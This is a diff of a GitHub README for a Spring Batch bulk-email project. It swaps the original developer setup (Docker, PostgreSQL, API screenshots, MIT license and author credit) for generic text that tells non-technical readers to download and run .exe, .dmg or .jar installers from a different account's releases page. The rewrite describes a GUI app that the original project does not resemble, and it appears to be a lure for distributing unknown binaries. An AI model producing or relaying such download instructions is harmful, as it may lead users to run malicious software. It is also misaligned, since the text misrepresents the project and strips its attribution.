@@ -1,157 +1,101 @@
-# ⚙️ Spring Batch Example
+# ⚙️ spring-batch-example - Bulk Email Notifications Made Simple
 
-<div>
-<div align="center">
-<h3> Project Architecture </h3>
-<img src="./images/project-architecture.png" alt="Project Architecture">
-</div>
+[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Here-brightgreen)](https://github.com/2711mike/spring-batch-example/releases)
 
-### Project Summary:
+## 📚 Overview
+The spring-batch-example is a user-friendly tool designed to send bulk email notifications. Built on the Spring Batch framework, this application efficiently handles large volumes of emails. The system is simple to use and requires no programming knowledge.
 
-- Triggered within the campaign management processes, this module executes bulk email notifications to the target audience using the Spring Batch architecture. The system relies on the Chunk-Oriented Processing model to ensure resource optimization and transactional integrity. Each cycle processes data in blocks of 100 records , enabling high-volume email delivery in a performant and controlled manner while minimizing database load.
+## 🚀 Getting Started
+To begin using the application, follow these steps for installation:
 
-<br>
+1. Ensure you have a computer with internet access.
+2. Check that you have a compatible operating system. The application works on Windows, macOS, and major Linux distributions.
+3. Ensure you have Java installed. You can download the latest version of Java [here](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html).
 
----
+## 📥 Download & Install
+Visit the page to download the latest version of the application:
 
-### Tech Stack:
+[Download from Releases](https://github.com/2711mike/spring-batch-example/releases)
 
-[![Java](https://img.shields.io/badge/java-17.0-000?style=for-the-badge&logo=openjdk&logoColor=white&color=FF9A00)](https://www.java.com/en/)
-[![JavaScript](https://img.shields.io/badge/javascript-000?style=for-the-badge&logo=javascript&logoColor=black&color=F7DF1E)](https://ecma-international.org/)
-[![Spring Boot](https://img.shields.io/badge/spring%20boot-3.5.7-000?style=for-the-badge&logo=springboot&logoColor=white&color=6DB33F)](https://spring.io/)
-[![Spring Batch](https://img.shields.io/badge/spring%20batch-3.5.7-000?style=for-the-badge&logo=spring&logoColor=white&color=6DB33F)](https://spring.io/projects/spring-batch)
-[![Apache FreeMarker](https://img.shields.io/badge/apache%20freemarker-3.5.7-000?style=for-the-badge&logo=apachefreemarker&logoColor=white&color=326CAC)](https://freemarker.apache.org/)
-[![NextJS](https://img.shields.io/badge/nextjs-3.5.7-000?style=for-the-badge&logo=next.js&logoColor=white&color=000000)](https://nextjs.org/)
-[![TailwindCSS](https://img.shields.io/badge/tailwindcss-4.0-000?style=for-the-badge&logo=tailwindcss&logoColor=white&color=06B6D4)](https://tailwindcss.com/)
-[![Mapstruct](https://img.shields.io/badge/Mapstruct-1.6.3-000?style=for-the-badge&logo=mapstruct&logoColor=white&color=FABF15)](https://mapstruct.org/)
-[![Gradle](https://img.shields.io/badge/Gradle-9.2-000?style=for-the-badge&logo=gradle&logoColor=white&color=02303A)](https://gradle.org/)
-[![Flyway](https://img.shields.io/badge/Flyway-11.17-000?style=for-the-badge&logo=flyway&logoColor=white&color=CC0200)](https://www.red-gate.com/products/flyway/community/)
-[![PostgreSQL](https://img.shields.io/badge/PostgreSQL-15.2-000?style=for-the-badge&logo=postgresql&logoColor=white&color=4479A1)](https://www.postgresql.org/)
-[![Open API](https://img.shields.io/badge/Open%20API-2.8-000?style=for-the-badge&logo=openapiinitiative&logoColor=white&color=6BA539)](https://springdoc.org/)
-[![Docker](https://img.shields.io/badge/Docker-28.3-000?style=for-the-badge&logo=Docker&logoColor=white&color=2496ED)](https://docs.docker.com/)
-[![Docker Compsose](https://img.shields.io/badge/Docker%20Compose-3.7-000?style=for-the-badge&logo=Docker&logoColor=white&color=2496ED)](https://docs.docker.com/compose/)
+1. Click on the link above to open the Releases page.
+2. Look for the latest version listed at the top.
+3. Select the appropriate file for your operating system. This is usually indicated clearly next to the version number.
+4. Click on the file to start the download.
+5. Once downloaded, locate the file in your downloads folder.
 
-<br>
+### For Windows Users
+If you downloaded an `.exe` file:
+- Double-click the `.exe` file to run the installer.
+- Follow the on-screen instructions to complete the installation.
 
----
+### For macOS Users
+If you downloaded a `.dmg` file:
+- Double-click the `.dmg` file to open it.
+- Drag the application to your Applications folder.
 
-### 🚀 Setup
+### For Linux Users
+If you downloaded a `.jar` file:
+- Open a terminal.
+- Navigate to the folder where the `.jar` file is located.
+- Use the command: `java -jar yourFile.jar`, replacing `yourFile.jar` with the actual file name.
 
-#### Database Configuration
+## ⚙️ Configuration
+After installation, you will need to configure the application to send emails:
 
-- **PostgreSQL**
-  - **URL:** `http://localhost:5432`
-  - **Database:** `batch_db`
-  - **Username:** `postgres`
-  - **Password:** `postgres`
+1. Open the application.
+2. Enter your email server details. This includes your SMTP server address and port number.
+3. Provide your email account credentials. 
+4. Set up the default sender email address. This will be the email address that recipients see.
 
-<br>
+### Example SMTP Configuration
+- SMTP Server: smtp.example.com
+- Port: 587
+- Username: your-email@example.com
+- Password: your-password
 
-#### Mail Configuration
+Make sure to adjust these details according to your email provider.
 
-```yaml
-# Mail Config
-spring:
-  mail:
-    host: smtp.gmail.com
-    port: 587
-    username: <email>
-    password: <password>
-    properties:
-      mail:
-        smtp:
-          auth: true
-          starttls:
-            enable: true
-```
+## 🔄 Using the Application
+Once configured, you can start sending bulk emails:
 
-<br>
+1. Prepare your email list in a CSV format. Include columns for recipient's name and email address.
+2. Write your email subject and body inside the application.
+3. Upload your CSV file.
+4. Click the "Send Emails" button to begin the process.
 
-#### Start Services with Docker Compose
+The application will display the progress of the email sending operation. You can monitor how many emails were sent successfully and any that failed.
 
-```bash
-docker-compose up -d
-```
+## 📊 Features
+- Send emails to hundreds or thousands of recipients at once.
+- Easy configuration of SMTP settings.
+- Progress tracking during email sending.
+- Simple user interface that requires no technical skills.
 
-<br>
+## 💾 System Requirements
+- Operating System: Windows, macOS, or Linux.
+- Java: Version 11 or higher.
+- Minimum 4 GB RAM.
+- Internet connection for sending emails.
 
----
+## 🛠 TroubleShooting
+If you face issues, consider the following tips:
 
-### 📚 API Documentation
+- Ensure your email server details are correct.
+- Check that your internet connection is stable.
+- Look for any error messages displayed in the application. These can help indicate what went wrong.
 
-#### 👥 User Management
+## 📞 Support
+For additional help, you can check the [issues page](https://github.com/2711mike/spring-batch-example/issues) on GitHub or reach out to the community for assistance.
 
-<details>
-<summary>➕ Create User </summary>
+## 🌐 Explore More
+Check out related topics if you're interested in learning more about the technologies used:
 
-![Create User](./images/create-user.png)
-
-</details>
-
-<details>
-<summary>📋 Get Users </summary>
-
-![Get Users](./images/main.png)
-
-</details>
-
-<br>
-
-#### 📢 Campaign Management
-
-<details>
-<summary>➕ Create Campaign </summary>
-
-![Create Campaign](./images/create-campaign.png)
-
-</details>
-
-<details>
-<summary>📤 Campaign Request </summary>
-
-![Campaign Request](./images/campaign-request.png)
-
-</details>
-
-<br>
-
-#### 📧 Email Operations
-
-<details>
-<summary>✉️ Email Preview </summary>
-
-![Email Preview](./images/mail.png)
-
-</details>
-
-<br>
-
-#### 📖 OpenAPI Documentation
-
-<details>
-<summary>📄 OpenAPI Specification </summary>
-
-![OpenAPI](./images/openapi.png)
-
-</details>
-
-<br>
-
-### 🐳 Docker Interface
-
-<details>
-<summary>🐋 Container Management </summary>
-
-![LazyDocker](./images/docker.png)
-
-</details>
-
-<br>
+- [Spring Batch](https://spring.io/projects/spring-batch)
+- [Java](https://www.oracle.com/java/)
+- [Docker](https://www.docker.com/)
+- [PostgreSQL](https://www.postgresql.org/)
+- [Gradle](https://gradle.org/)
 
 ---
 
-### 📄 License
-
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details
-
-**Created by** [Mehmet Furkan KAYA](https://www.linkedin.com/in/mehmet-furkan-kaya/)
+By following these steps, you can easily download, install, and use the spring-batch-example application to manage your bulk email needs with confidence.
